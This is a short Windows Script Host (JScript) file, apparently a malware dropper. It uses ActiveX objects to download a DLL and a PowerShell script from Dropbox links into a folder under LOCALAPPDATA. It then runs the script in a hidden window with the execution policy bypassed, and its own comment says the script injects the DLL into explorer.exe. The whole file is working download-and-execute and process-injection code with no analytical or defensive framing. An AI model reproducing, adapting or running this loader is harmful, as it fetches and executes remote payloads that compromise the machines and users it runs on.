try {
    // Create WScript.Shell and FileSystemObject instances
    var objShell = new ActiveXObject("WScript.Shell");
    var fso = new ActiveXObject("Scripting.FileSystemObject");

    // Define URL and target file path for the DLL
    var dllUrl = "https://www.dropbox.com/scl/fi/1vos32664821c9kwu4rrv/ANCIENT_CANVAS.dll?rlkey=ssokz83a932t4arjja976bto7&st=e83e72qh&dl=1";
    var targetDll = objShell.ExpandEnvironmentStrings("%LOCALAPPDATA%\\DownloadedFolder\\ANCIENT_CANVAS.dll");

    // Define URL and target file path for the PowerShell script
    var psUrl = "https://www.dropbox.com/scl/fi/2g7hjkyjgi84tru0cpse6/psscript.ps1?rlkey=wqq7h5t8wqbohdfh5krezwcx5&st=tvayqmxc&dl=1"; // Replace with the actual URL
    var targetPs = objShell.ExpandEnvironmentStrings("%LOCALAPPDATA%\\DownloadedFolder\\InjectScript.ps1");

    // Ensure the target directory exists
    var folderPath = objShell.ExpandEnvironmentStrings("%LOCALAPPDATA%\\DownloadedFolder");
    if (!fso.FolderExists(folderPath)) {
        fso.CreateFolder(folderPath);
    }

    // Function to download a file
    function downloadFile(url, targetPath) {
        var xhr = new ActiveXObject("MSXML2.XMLHTTP");
        xhr.open("GET", url, false);
        xhr.send();

        var stream = new ActiveXObject("ADODB.Stream");
        stream.Type = 1; // Binary
        stream.Open();
        stream.Write(xhr.responseBody);
        stream.SaveToFile(targetPath, 2); // Overwrite if exists
        stream.Close();
    }

    // Download the DLL
    downloadFile(dllUrl, targetDll);

    // Download the PowerShell script
    downloadFile(psUrl, targetPs);

    // Run the PowerShell script to inject the DLL into explorer.exe
    objShell.Run("powershell -ExecutionPolicy Bypass -File " + targetPs, 0, true);

} catch (e) {
    // Error handling
    WScript.Echo("Error: " + e.message);
}
